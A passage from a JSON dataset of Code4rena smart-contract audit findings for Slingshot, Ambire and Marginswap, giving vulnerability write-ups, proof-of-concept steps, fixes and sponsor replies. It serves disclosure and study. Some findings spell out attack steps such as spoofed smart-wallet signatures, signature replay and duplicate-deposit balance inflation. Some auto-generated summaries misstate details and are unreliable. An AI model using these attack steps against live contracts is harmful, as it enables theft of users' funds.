view returns (uint256) {\n    if (token == nativeToken) {\n        return address(executioner).balance;\n    } else {\n        return IERC20(token).balanceOf(address(executioner));\n    }\n}\n```\n\nWhen users swap to native token (ETH), the `initialBalance` should use the balance of `wrappedNativeToken` instead of native token balance, because `finalBalance` is the balance of `wrappedNativeToken`.\n\nIn the current implementation, when the `toToken` is the native token, `initialBalance` will be the ether balance of `executioner` contract. Therefore, when the ether balance of `executioner` is not 0, `finalOutputAmount` will be wrong.\n\nThe attacker can transfer a certain amount of ETH to the `executioner` contract and malfunction the protocol. Causing fund loss to users because `finalOutputAmount` is lower than the actual swapped amount, or DoS due to `finalAmountMin` cant be met.\n\n#### Proof of Concept\n\nGiven:\n\n*   The attacker send 0.25 ETH to the `executioner` contract;\n*   The price of ETH in USDC is: 4000\n\n1.  Alice swaps 5000 USDC to 1.25 ETH with `finalAmountMin` set to `1 ETH`;\n2.  Alice will get 1 ETH out and lose 0.25 ETH;\n3.  Bob swaps 1000 USDC to 0.25 ETH with `finalAmountMin` set to `1 wei`;\n4.  Bob's transaction fails due to `finalAmountMin` cant being met.\n\n#### Recommendation\n\nConsider updating `_getTokenBalance()` and return `IERC20(wrappedNativeToken).balanceOf(address(executioner));` when `token == nativeToken`.\n\n**[tommyz7 (Slingshot) disagreed with severity](https://github.com/code-423n4/2021-10-slingshot-findings/issues/59#issuecomment-959279936):**\n > \"Alice swaps 5000 USDC to 1.25 ETH with finalAmountMin set to 1 ETH;\" this assumption is wrong because it's based on huge slippage assumption. There is no way a Slingshot transaction accepts 20% slippage so funds loss scenario is incorrect.\n> \n> duplicate of #18, medium risk since no user funds are at risk.\n\n\n\n",
      "summary": "\nThe bug report is about a potential issue in the Slingshot smart contract. The function \"executeTrades\" has a variable called \"finalAmountMin\" which is used to determine the minimum amount of tokens that should be received after the trades are executed. However, this variable is not being used correctly, and it can lead to incorrect calculations and potential loss of funds for users. The issue is caused by the use of the wrong token balance in the function \"_getTokenBalance\". The report suggests a solution to update the function to use the correct token balance. The severity of the bug is debated, with some members arguing that it is a medium risk since it does not directly affect user funds. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Slingshot Finance",
      "source_link": "https://code4rena.com/reports/2021-10-slingshot",
      "github_link": "https://github.com/code-423n4/2021-10-slingshot-findings/issues/59",
      "tags": [],
      "finders": []
    },
    {
      "id": "959",
      "title": "[M-02] Trades where toToken is feeOnTransferToken might send user less tokens than finalAmountMin",
      "impact": "MEDIUM",
      "content": "_Submitted by kenzo_.\n\nSlingshot's `executeTrades` checks that the trade result amount (to be sent to the user) is bigger than `finalAmountMin`, and *after that* sends the user the amount. But if the token charges fee on transfer, the final transfer to the user will decrease the amount the user is getting, maybe below `finalAmountMin`.\n\n#### Proof of Concept\n\nSlingshot requires `finalOutputAmount >= finalAmountMin` *before* sending the funds to the user:\n<https://github.com/code-423n4/2021-10-slingshot/blob/main/contracts/Slingshot.sol#L93:#L98>\nSo if the token charges fees on transfer, the user will get less tokens than `finalOutputAmount` . The check of `finalOutputAmount` against `finalAmountMin` is premature.\n\n#### Tools Used\n\nManual analysis\n\n#### Recommended Mitigation Steps\n\nSave the user's (not Executioner's) `toToken` balance in the beginning of `executeTrades` after `_transferFromOrWrap(fromToken, _msgSender(), fromAmount)`, and also in the very end, after `executioner.sendFunds(toToken, _msgSender(), finalOutputAmount)` has been called. The subtraction of user's initial balance from ending balance should be bigger than `finalAmountMin`.\n<https://github.com/code-423n4/2021-10-slingshot/blob/main/contracts/Slingshot.sol#L65:#L99>\n\n**[tommyz7 (Slingshot) disagreed with severity](https://github.com/code-423n4/2021-10-slingshot-findings/issues/77#issuecomment-959385967):**\n > Slingshot concern is to execute the trade as promised and make sure we are sending to the user what has been promised in trade estimation. If the token adds additional taxation on transfer, it is on the user side and users understand and accept this. We have seen this play out on production for the previous version of the contracts and we decided not to make that check. It seems the most practical decision.\n> \n> Personally, I think this is non-critical.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-10-slingshot-findings/issues/77#issuecomment-962400182):**\n > The severity for the issue is right. The sponsor should add documentation to the fact that some tokens might not conform to common expectations.\n\n",
      "summary": "\nA bug was reported in Slingshot's `executeTrades` function, which checks that the trade result amount (to be sent to the user) is bigger than finalAmountMin, and then sends the user the amount. The bug is that if the token charges fee on transfer, the final transfer to the user will decrease the amount the user is getting, maybe below finalAmountMin. The bug is caused by the fact that Slingshot requires `finalOutputAmount >= finalAmountMin` _before_ sending the funds to the user, instead of after. The recommended mitigation step is to save the user's (not Executioner's) toToken balance in the beginning of `executeTrades` after `_transferFromOrWrap(fromToken, _msgSender(), fromAmount)`, and also in the very end, after `executioner.sendFunds(toToken, _msgSender(), finalOutputAmount)` has been called. The subtraction of user's initial balance from ending balance should be bigger than `finalAmountMin`. Manual analysis was used to detect the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Slingshot Finance",
      "source_link": "https://code4rena.com/reports/2021-10-slingshot",
      "github_link": "https://github.com/code-423n4/2021-10-slingshot-findings/issues/77",
      "tags": [],
      "finders": [
        "kenzo."
      ]
    },
    {
      "id": "958",
      "title": "[M-01] initialBalance for native token is wrong",
      "impact": "MEDIUM",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2021-10-slingshot/blob/9c0432cca2e43731d5a0ae9c151dacf7835b8719/contracts/Slingshot.sol#L65-L92\n\n```solidity=65{81,88}\nfunction executeTrades(\n    address fromToken,\n    address toToken,\n    uint256 fromAmount,\n    TradeFormat[] calldata trades,\n    uint256 finalAmountMin,\n    address depricated\n) external nonReentrant payable {\n    depricated;\n    require(finalAmountMin > 0, \"Slingshot: finalAmountMin cannot be zero\");\n    require(trades.length > 0, \"Slingshot: trades cannot be empty\");\n    for(uint256 i = 0; i < trades.length; i++) {\n        // Checks to make sure that module exists and is correct\n        require(moduleRegistry.isModule(trades[i].moduleAddress), \"Slingshot: not a module\");\n    }\n\n    uint256 initialBalance = _getTokenBalance(toToken);\n    _transferFromOrWrap(fromToken, _msgSender(), fromAmount);\n\n    executioner.executeTrades(trades);\n\n    uint finalBalance;\n    if (toToken == nativeToken) {\n        finalBalance = _getTokenBalance(address(wrappedNativeToken));\n    } else {\n        finalBalance = _getTokenBalance(toToken);\n    }\n    uint finalOutputAmount = finalBalance - initialBalance;\n    ...\n```\n\nhttps://github.com/code-423n4/2021-10-slingshot/blob/9c0432cca2e43731d5a0ae9c151dacf7835b8719/contracts/Slingshot.sol#L157-L163\n\n```solidity=157\nfunction _getTokenBalance(address token) internal view returns (uint256) {\n    if (token == nativeToken) {\n        return address(executioner).balance;\n    } else {\n        return IERC20(token).balanceOf(address(executioner));\n    }\n}\n```\n\nWhen users swap to native token (ETH), the `initialBalance` should use the balance of `wrappedNativeToken` instead of native token balance, because `finalBalance` is the balance of `wrappedNativeToken`.\n\nIn the current implementation, when the `toToken` is the native token, `initialBalance` will be the ether balance of `executioner` contract. Therefore, when the ether balance of `executioner` is not 0, `finalOutputAmount` will be wrong.\n\nThe attacker can transfer a certain amount of ETH to the `executioner` contract and malfunction the protocol. Causing fund loss to users because `finalOutputAmount` is lower than the actual swapped amount, or DoS due to `finalAmountMin` cant be met.\n\n### PoC\n\nGiven:\n\n- The attacker send 0.25 ETH to the `executioner` contract;\n- The price of ETH in USDC is: 4000\n\n1. Alice swaps 5000 USDC to 1.25 ETH with `finalAmountMin` set to `1 ETH`;\n2. Alice will get 1 ETH out and lose 0.25 ETH;\n3. Bob swaps 1000 USDC to 0.25 ETH with `finalAmountMin` set to `1 wei`;\n4. Bob's transaction fails due to `finalAmountMin` cant being met.\n\n### Recommendation\n\nConsider updating `_getTokenBalance()` and return `IERC20(wrappedNativeToken).balanceOf(address(executioner));` when `token == nativeToken`.",
      "summary": "\nThis bug report is about an issue with the WatchPug smart contract. The issue is that when users swap to the native token (ETH), the initial balance should use the balance of the wrappedNativeToken instead of the native token balance, because the final balance is the balance of the wrappedNativeToken. As a result, when the ether balance of the executioner is not 0, the final output amount will be wrong. This can lead to fund loss for users or denial of service due to the final amount minimum not being met. To demonstrate this, the bug report provides an example of two users, Alice and Bob, who attempt to swap USDC for ETH. The bug report then provides a recommendation for fixing the issue. The recommendation is to update the _getTokenBalance() function and return the balance of the wrappedNativeToken when the token is the native token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Slingshot Finance",
      "source_link": "https://code4rena.com/reports/2021-10-slingshot",
      "github_link": "https://github.com/code-423n4/2021-10-slingshot-findings/issues/59",
      "tags": [],
      "finders": [
        "gpersoon",
        "pmerkleplant.",
        "hickuphh3",
        "WatchPug",
        "daejunpark",
        "kenzo"
      ]
    },
    {
      "id": "25588",
      "title": "[H-04] `QuickAccManager` Smart Contract signature verification can be exploited",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nSeveral different signature modes can be used and `Identity.execute` forwards the `signature` parameter to the `SignatureValidator` library.\nThe returned `signer` is then used for the `privileges` check:\n\n```solidity\naddress signer = SignatureValidator.recoverAddrImpl(hash, signature, true);\n// signer will be QuickAccountContract\nrequire(privileges[signer] != bytes32(0), 'INSUFFICIENT_PRIVILEGE');\n```\n\nIt's possible to create a smart contract mode signature (`SignatureMode.SmartWallet`) for arbitrary transactions as the `QuickAccManager.isValidSignature` uses an attacker-controlled `id` identity contract for the privileges check.\nAn attacker can just create an attacker contract returning the desired values and the smart-wallet signature appears to be valid:\n\n```solidity\n// @audit id is attacker-controlled\n(address payable id, uint timelock, bytes memory sig1, bytes memory sig2) = abi.decode(signature, (address, uint, bytes, bytes));\n// @audit this may not be used for authorization, attacker can return desired value\nif (Identity(id).privileges(address(this)) == accHash) {\n  // bytes4(keccak256(\"isValidSignature(bytes32,bytes)\")\n  return 0x1626ba7e;\n} else {\n  return 0xffffffff;\n}\n```\n\n#### POC\nAssume an `Identity` contract is set up with a `QuickAccManager` as the `privileges` account, i.e. `privileges[accHash] != 0`.\n\nWe can construct a `SignatureMode.SmartWallet` signature for an *arbitrary* hash:\n\n1.  Call `Identity.execute(txns, spoofedSignature)` where `spoofedSignature = abi.encode(attackerContract, timelock=0, sig1=0, sig2=0, address(quickAccountManager), SignatureMode.SmartWallet)`\n2.  This will call `recoverAddrImpl(txnsHash, spoofedSignature, true)`, decode the bytes **at the end** of `spoofedSignature` and determine `mode = SignatureMode.SmartWallet` and `wallet = quickAccountManager`. It will cut off these arguments and call `quickAccountManager.isValidSignature(txnsHash, (attackerContract, 0, 0, 0))`\n3.  The `QuickAccManager` will decode the signature, construct `accHash` which is the hash of all zeroes (due to failed signatures returning 0). It will then call `attacker.privileges(address(this))` and the attacker contract can return the `accHash` that matches an account hash of failed signatures, i.e., `keccak256(abi.encode(QuickAccount(0,0,0)))`. The comparison is satisfied and it returns the success value.\n4.  The checks in `Identity.execute` pass and the transactions `txns` are executed.\n\n#### Impact\nAny `Identity` contract using `QuickAccManager` can be exploited.\nFunds can then be stolen from the wallet.\n\n#### Recommendation\nThe issue is that `QuickAccManager` blindly trusts the values in `signature`.\nIt might be enough to remove the `id` from the `signature` and use `msg.sender` as the identity instead: `Identity(msg.sender).privileges(address(this)) == accHash`.\nThis seems to work with the current `Identity` implementation but might not work if this is extended and the `isValidSignature` is called from another contract and wants to verify a signature on a different identity.\nIn that case, the `Identity/SignatureValidator` may not blindly forward the attacker-supplied signature and instead needs to re-encode the parameters with trusted values before calling `QuickAccManager`.\n\n**[Ivshti (Ambire) confirmed and patched](https://github.com/code-423n4/2021-10-ambire-findings/issues/40#issuecomment-946828671):**\n > great find! Mitigated in https://github.com/AmbireTech/adex-protocol-eth/commit/17c073d037ded76d56d6145faa92c1959fd47226 but still figuring out whether this is the best way to do it\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2021-10-ambire-findings/issues/40#issuecomment-950840624):**\n > May need to sit on this one for another day before I can fully comment\n>\n> Fundamentally by calling Identity.execute with mostly 0 data, you are able to call back to `QuickAccManager. isValidSignature` which, due to the implementation of `ecrecover` at the time, will return valid checks for address(0), allowing to bypass all the logic and returning true for the signature, allowing for the execution of arbitrary code.\n>\n> Again, need to sit on this one\n>\n> But wouldn't you also be able to set a malicious smartContractWallet as the `IERC1271Wallet`, hence you can sidestep the entire logic, as your malicious contract wallet can be programmed to always return true on any input value?\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2021-10-ambire-findings/issues/40#issuecomment-950849976):**\n > @GalloDaSballo (judge) this doesn't have to do with `address(0)`\n>\n> Using smart wallets for signatures by itself is not a problem - since they authorize as themselves.\n>\n> The fundamental root of this issue is that ERC 1271 was designed with the assumption that 1 contract = 1 wallet. And as such, `isValidSignature` only returns `true`/`false`. This makes sense, as essentially we're asking the wallet \"is this a valid signature from you\", and then the wallet decides how to actually validate this it depending on it's own behavior and permissions.\n>\n> However, the QuickAccManager is a singleton contract - one single QuickAccManager represents multiple users. As such, combining it with ERC 1271 is a logical misunderstanding, as we can't really ask it \"is this a valid sig for X identity\" through the ERC 1271 interface. So instead, we encode the identity that we're signing as in the sig itself, but then a malicious user could call a top-level identity with a sig that validates in the singleton `QuickAccManager`, but meant to validate with a differerent identity.\n>\n> Because what we pass to `isValidSignature` is opaque data (the smart wallet may be any contract with any logic, not just our `QuickAccManager`) we can't just peak into the sig and see if it's meant to validate with the caller identity.\n>\n> Excellent finding IMO\n>\n> The current mitigation is hacky, and essentially leads to an `isValidSignature` implementation that is unusable (and doesn't make sense) off-chain, but we prefer it to introducing a new sig type especially for QuickAccManager.\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2021-10-ambire-findings/issues/40#issuecomment-950870846):**\n > @Ivshti (Ambire) To clarify:\n> Would adding `privileges[QuickAccountManager] = bytes32(uint(1))`enable the exploit?\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2021-10-ambire-findings/issues/40#issuecomment-950871925):**\n > @GalloDaSballo (judge) yes, it would. Any authorized quickAcc would enable the exploit\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2021-10-ambire-findings/issues/40#issuecomment-950906951):**\n > I'm starting to get this\n>\n> The `id` sent to `isValidSignature` is an untrusted, unverified address\n> The contract at that address can be programmed to have a function `privileges` which would return any `bytes32` value to match `accHash`\n> This effectively allows to run arbitrary transactions.\n>\n> A way to mitigate would be to have a way to ensure the called `id` is trusted\n> A registry of trusted ids may be effective\n>\n> The mitigation the sponsor has chosen does solve for only using trusted Identities as in the case of a malicious Identity, the Identity would just validate it's own transaction, not putting other Identities funds at risk.\n>\n> An alternative solution would be to change the`IdentityFactory` to use the OpenZeppelin Clones Library (or similar) to ensure that the correct Logic is deployed (by deploying a minimal-proxy pointing to the trusted implementation).\n> This would require a fair tech-lift and would limit the type of deployments that the IdentityFactory can perform.\n>\n> The exploit was severe and the sponsor has mitigated by checking the `msg.sender` against the `id` provided in the signature\n>\n\n",
      "summary": "\nA bug was found in the `Identity.execute` function of the `SignatureValidator` library which allows an attacker to create a smart contract mode signature for arbitrary transactions. This is done by using an attacker-controlled identity contract for the privileges check. The attacker can just create an attacker contract returning the desired values and the smart-wallet signature appears to be valid. This allows for the execution of arbitrary code and funds can be stolen from the wallet.\n\nThe bug can be mitigated by removing the `id` from the `signature` and using `msg.sender` as the identity instead. Alternatively, a registry of trusted ids may be used, or a minimal-proxy pointing to a trusted implementation can be deployed.\n\nThe sponsor has mitigated the exploit by checking the `msg.sender` against the `id` provided in the signature.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2021-10-ambire",
      "github_link": "https://github.com/code-423n4/2021-10-ambire-findings/issues/40",
      "tags": [],
      "finders": []
    },
    {
      "id": "25587",
      "title": "[H-03] Signature replay attacks for different identities (nonce on wrong party)",
      "impact": "HIGH",
      "content": "_Submitted by cmichel, also found by WatchPug_\n\nA single `QuickAccount` can serve as the \"privilege\" for multiple identities, see the comment in `QuickAccManager.sol`:\n\n> NOTE: a single accHash can control multiple identities, as long as those identities set it's hash in privileges\\[address(this)]. this is by design\n\nIf there exist two different identities that *both share the same QuickAccount* (`identity1.privileges(address(this)) == identity2.privileges(address(this)) == accHash`) the following attack is possible in `QuickAccManager.send`:\n\nUpon observing a valid `send` on the first identity, the same transactions can be replayed on the second identity by an attacker calling `send` with the same arguments and just changing the `identity` to the second identity.\n\nThis is because the `identity` is not part of the `hash`. Including the **nonce of** the identity in the hash is not enough.\n\nTwo fresh identities will both take on nonces on zero and lead to the same hash.\n\n#### Impact\nTransactions on one identity can be replayed on another one if it uses the same `QuickAccount`.\nFor example, a transaction paying a contractor can be replayed by the contract on the second identity earning the payment twice.\n\n#### Recommended Mitigation Steps\n\n1.  Nonces should not be indexed by the identity but by the `accHash`. This is because nonces are used to stop replay attacks and thus need to be on the *signer* (`QuickAccount` in this case), not on the target contract to call.\n2.  The `identity` *address* itself needs to be part of `hash` as otherwise the `send` can be frontrun and executed by anyone on the other identity by switching out the `identity` parameter.\n\n#### Other occurrences\nThis issue of using the wrong nonce (on the `identity` which means the nonces repeat per identity) and not including `identity` address leads to other attacks throughout the `QuickAccManager`:\n\n*   `cancel`: attacker can use the same signature to cancel the same transactions on the second identity\n*   `execScheduled`: can frontrun this call and execute it on the second identity instead. This will make the original transaction fail as `scheduled[hash]` is deleted.\n*   `sendTransfer`: same transfers can be replayed on second identity\n*   `sendTxns`: same transactions can be replayed on second identity\n\n\n**[Ivshti (Ambire) confirmed](https://github.com/code-423n4/2021-10-ambire-findings/issues/39#issuecomment-946825757):**\n > duplicate of #24, but it's better documented\n\n**[Ivshti (Ambire) patched](https://github.com/code-423n4/2021-10-ambire-findings/issues/39#issuecomment-946999413):**\n > mitigation step 1 is not going to be done, since there's already plenty of upper level code relying on indexing by identity, and it doesn't really hurt if the replay attack is mitigated\n>\n> plus, it makes it harder to look up the nonce value, as we have to compute the accHash in the client-side code\n>\n> the replay attack has been fixed here https://github.com/AmbireTech/adex-protocol-eth/commit/f70ca38f368da30c9881d1ee5554fd0161c94486\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2021-10-ambire-findings/issues/39#issuecomment-950825823):**\n > The warden identified a Signature Replay attack, allowing to re-use a signature throughout the system.\n>\n> Requiring the identity to be part of the signatures mitigates the vulnerability\n>\n> The sponsor has mitigated in a subsequent PR\n\n",
      "summary": "\nA bug report has been submitted which highlights a Signature Replay attack in the QuickAccManager code. If two different identities share the same QuickAccount, an attacker could use the same signature to replay a transaction on the second identity, allowing them to earn the payment twice. This is because the identity is not part of the hash, and including the nonce of the identity in the hash is not enough, as two fresh identities will both take on nonces of zero and lead to the same hash. \n\nThe bug report recommends two mitigation steps to prevent the attack. First, nonces should not be indexed by the identity but by the accHash, as nonces are used to stop replay attacks and thus need to be on the signer (QuickAccount in this case), not on the target contract to call. Secondly, the identity address should be part of the hash, as this will prevent the send call from being frontrun and executed by anyone on the other identity by switching out the identity parameter.\n\nThe bug report also mentions other occurrences in the QuickAccManager where the wrong nonce (on the identity) and not including identity address leads to other attacks, such as cancel, execScheduled, sendTransfer, and sendTxns. The bug report was confirmed as a duplicate of a previous issue, and a subsequent PR has mitigated the vulnerability by requiring the identity to be part of the signatures.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2021-10-ambire",
      "github_link": "https://github.com/code-423n4/2021-10-ambire-findings/issues/39",
      "tags": [],
      "finders": []
    },
    {
      "id": "25586",
      "title": "[H-02] `QuickAccManager.sol#cancel()` Wrong `hashTx` makes it impossible to cancel a scheduled transaction",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by gpersoon_\n\nIn `QuickAccManager.sol#cancel()`, the `hashTx` to identify the transaction to be canceled is wrong. The last parameter is missing.\n\nAs a result, users will be unable to cancel a scheduled transaction.\n\n [`QuickAccManager.sol#L91` L91](https://github.com/code-423n4/2021-10-ambire/blob/bc01af4df3f70d1629c4e22a72c19e6a814db70d/contracts/wallet/QuickAccManager.sol#L91-L91)\n```solidity\nfunction cancel(Identity identity, QuickAccount calldata acc, uint nonce, bytes calldata sig, Identity.Transaction[] calldata txns) external {\n  bytes32 accHash = keccak256(abi.encode(acc));\n  require(identity.privileges(address(this)) == accHash, 'WRONG_ACC_OR_NO_PRIV');\n\n  bytes32 hash = keccak256(abi.encode(CANCEL_PREFIX, address(this), block.chainid, accHash, nonce, txns, false));\n  address signer = SignatureValidator.recoverAddr(hash, sig);\n  require(signer == acc.one || signer == acc.two, 'INVALID_SIGNATURE');\n\n  // @NOTE: should we allow cancelling even when it's matured? probably not, otherwise there's a minor grief\n  // opportunity: someone wants to cancel post-maturity, and you front them with execScheduled\n  bytes32 hashTx = keccak256(abi.encode(address(this), block.chainid, accHash, nonce, txns));\n  require(scheduled[hashTx] != 0 && block.timestamp < scheduled[hashTx], 'TOO_LATE');\n  delete scheduled[hashTx];\n\n  emit LogCancelled(hashTx, accHash, signer, block.timestamp);\n}\n```\n\n##### Recommendation\nChange to:\n\n```solidity\nbytes32 hashTx = keccak256(abi.encode(address(this), block.chainid, accHash, nonce, txns, false));\n```\n\n**[Ivshti (Ambire) confirmed and resolved](https://github.com/code-423n4/2021-10-ambire-findings/issues/1#issuecomment-946823825):**\n > Great find, resolved in https://github.com/AmbireTech/adex-protocol-eth/commit/5c5e6f0cb47e83793dafc08630577b93500c86ab\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2021-10-ambire-findings/issues/1#issuecomment-950416817):**\n > The warden has found that the method `cancel` was calculating the wrong `hashTx`, this hash, used to verify which transaction to cancel, making it impossible to cancel a transaction.\n>\n> The sponsor has mitigated in a  subsequent pr\n\n",
      "summary": "\nThis bug report was submitted by WatchPug and found by gpersoon. In the `QuickAccManager.sol#cancel()` function, the `hashTx` parameter used to identify the transaction to be canceled was incorrect. The last parameter was missing, which caused users to be unable to cancel a scheduled transaction.\n\nThe code snippet at `QuickAccManager.sol#L91` was changed to include the missing parameter. Ivshti (Ambire) confirmed and resolved the issue with a commit, and GalloDaSballo (judge) commented that the sponsor had successfully mitigated the issue in a subsequent pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2021-10-ambire",
      "github_link": "https://github.com/code-423n4/2021-10-ambire-findings/issues/1",
      "tags": [],
      "finders": []
    },
    {
      "id": "25585",
      "title": "[H-01] Prevent execution with invalid signatures",
      "impact": "HIGH",
      "content": "_Submitted by gpersoon_\n\n#### Impact\nSuppose one of the supplied `addrs\\[i]` to the constructor of `Identity.sol` happens to be 0 ( by accident).\n\nIn that case: `privileges\\[0] = 1`\n\nNow suppose you call `execute()` with an invalid signature, then `recoverAddrImpl` will return a value of 0 and thus signer=0.\nIf you then check \"`privileges\\[signer] !=0`\"  this will be true and anyone can perform any transaction.\n\nThis is clearly an unwanted situation.\n\n#### Proof of Concept\n  - [`Identity.sol#L23` L30](https://github.com/code-423n4/2021-10-ambire/blob/bc01af4df3f70d1629c4e22a72c19e6a814db70d/contracts/Identity.sol#L23-L30)\n  - [`Identity.sol#L97` L98](https://github.com/code-423n4/2021-10-ambire/blob/bc01af4df3f70d1629c4e22a72c19e6a814db70d/contracts/Identity.sol#L97-L98)\n\n#### Recommended Mitigation Steps\nIn the constructor of `Identity.sol`, add in the for loop the following:\n\n```solidity\nrequire (addrs\\[i] !=0,\"Zero not allowed\");\n```\n\n**[Ivshti (Ambire) confirmed](https://github.com/code-423n4/2021-10-ambire-findings/issues/13#issuecomment-946844237):**\n\n**[Ivshti (Ambire) patched](https://github.com/code-423n4/2021-10-ambire-findings/issues/13#issuecomment-946894869):**\n > resolved in https://github.com/AmbireTech/adex-protocol-eth/commit/08d050676773fcdf7ec1c4eb53d51820b7e42534\n\n**[GalloDaSballo (judge) commented](https://github.com/code-423n4/2021-10-ambire-findings/issues/13#issuecomment-948088151):**\n > This seems to be the risk of having `erecover` returning zero, any invalid signature ends up being usable from any address to execute arbitrary logic.\n>\n> Mitigation can be achieved by either reverting when about to return address(0), which the sponsor has used for mitigation\n>\n> The other mitigation is to ensure that an account with address(0) cannot have privileges set to 1\n>\n> I believe mitigation from sponsor to be sufficient, however I'd recommend adding a check against having address(0) in the constructor for Identity.sol just to be sure\n>\n\n**[Ivshti (Ambire) commented](https://github.com/code-423n4/2021-10-ambire-findings/issues/13#issuecomment-948276331):**\n > @GalloDeSballo an extra check is superfluous IMO, not only cause the revert on 0 in SIgnatureValidatorV2 guarantees that this is fixed, but also because it has to be in three places: constructor, setAddrPrivilege and the account creation system in `js/IdentityProxyDeploy` which rolls out bytecode that `sstores` privileges directly\n\n",
      "summary": "\nA bug was identified in the `Identity.sol` contract, where if one of the supplied `addrs[i]` to the constructor of `Identity.sol` is 0 (by accident), then `privileges[0] = 1` and anyone can perform any transaction if `execute()` is called with an invalid signature. This bug was confirmed and patched by Ivshti (Ambire), with a mitigation step of adding a check in the constructor of `Identity.sol` to ensure that an address of 0 cannot have privileges set to 1. This was commented on by GalloDeSballo (judge), who suggested the mitigation step and Ivshti (Ambire) commented that it was superfluous as the revert on 0 in the SignatureValidatorV2 guarantees that this is fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2021-10-ambire",
      "github_link": "https://github.com/code-423n4/2021-10-ambire-findings/issues/13",
      "tags": [],
      "finders": []
    },
    {
      "id": "42153",
      "title": "[M-01] No default `liquidationThresholdPercent`",
      "impact": "MEDIUM",
      "content": "\nThe `IsolatedMarginTrading` contract does not define a default `liquidationThresholdPercent` which means it is set to 0. The `belowMaintenanceThreshold` function uses this value and anyone could be liquidated due to `100 * holdings >= liquidationThresholdPercent * loan = 0` being always true.\n\nAnyone can be liquidated immediately. If the faulty `belowMaintenanceThreshold` function is fixed (see other issue), then nobody could be liquidated which is bad as well.\n\nRecommend setting a default liquidation threshold like in `CrossMarginTrading` contracts.\n\n",
      "summary": "\nThis bug report is about a contract called `IsolatedMarginTrading` which has an issue with its `liquidationThresholdPercent` value. This value is not defined by default, meaning it is set to 0. This creates a problem because the `belowMaintenanceThreshold` function uses this value, which can cause anyone to be liquidated immediately. This is because the formula used in this function is always true when the `liquidationThresholdPercent` is set to 0. This is not desirable as it can lead to people being liquidated without warning. The report suggests that a default liquidation threshold should be set, similar to other contracts such as `CrossMarginTrading`. This will prevent immediate liquidation and ensure fairness for all users. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/28",
      "tags": [],
      "finders": []
    },
    {
      "id": "42152",
      "title": "[H-07] `account.holdsToken` is never set",
      "impact": "HIGH",
      "content": "\nThe `addHolding` function does not update the `account.holdsToken` map.\n\n```solidity\nfunction addHolding(\n    CrossMarginAccount storage account,\n    address token,\n    uint256 depositAmount\n) internal {\n    if (!hasHoldingToken(account, token)) {\n        // SHOULD SET account.holdsToken here\n        account.holdingTokens.push(token);\n    }\n\n    account.holdings[token] += depositAmount;\n}\n```\n\nThis leads to a critical vulnerability where deposits of the same token keep being pushed to the `account.holdingTokens` array but the sum is correctly updated in `account.holdings[token]`. However, because of the duplicate token in the `holdingTokens` array the same token is counted several times in the `getHoldingAmounts` function:\n\n```solidity\nfunction getHoldingAmounts(address trader)\n    external\n    view\n    override\n    returns (\n        address[] memory holdingTokens,\n        uint256[] memory holdingAmounts\n    )\n{\n    CrossMarginAccount storage account = marginAccounts[trader];\n    holdingTokens = account.holdingTokens;\n\n    holdingAmounts = new uint256[](account.holdingTokens.length);\n    for (uint256 idx = 0; holdingTokens.length > idx; idx++) {\n        address tokenAddress = holdingTokens[idx];\n        // RETURNS SUM OF THE BALANCE FOR EACH TOKEN ENTRY\n        holdingAmounts[idx] = account.holdings[tokenAddress];\n    }\n}\n```\n\nThe `MarginRouter.crossCloseAccount` function uses these wrong amounts to withdraw all tokens:\n\n```solidity\nfunction crossCloseAccount() external {\n    (address[] memory holdingTokens, uint256[] memory holdingAmounts) =\n        IMarginTrading(marginTrading()).getHoldingAmounts(msg.sender);\n\n    // requires all debts paid off\n    IMarginTrading(marginTrading()).registerLiquidation(msg.sender);\n\n    for (uint256 i; holdingTokens.length > i; i++) {\n        Fund(fund()).withdraw(\n            holdingTokens[i],\n            msg.sender,\n            holdingAmounts[i]\n        );\n    }\n}\n```\n\nAn attacker can just deposit the same token X times which increases their balance by X times the actual value.\nThis inflated balance can then be withdrawn to steal all tokens.\n\nRecommend correctly setting the `account.holdsToken` map in `addHolding`.\n\n",
      "summary": "\nThe `addHolding` function in the code does not correctly update the `account.holdsToken` map. This leads to a critical vulnerability where an attacker can deposit the same token multiple times and withdraw a larger amount than their actual balance. The `getHoldingAmounts` function also uses the incorrect amounts, leading to a further vulnerability. To fix this issue, the `account.holdsToken` map should be correctly set in the `addHolding` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Marginswap",
      "source_link": "https://code4rena.com/reports/2021-04-marginswap",
      "github_link": "https://github.com/code-423n4/2021-04-marginswap-findings/issues/25",
      "tags": [],
      "finders": []
    },
    {
      "id": "42151",
      "title": "[H-06] Users are credited more tokens when paying back debt with `registerTradeAndBorrow`",
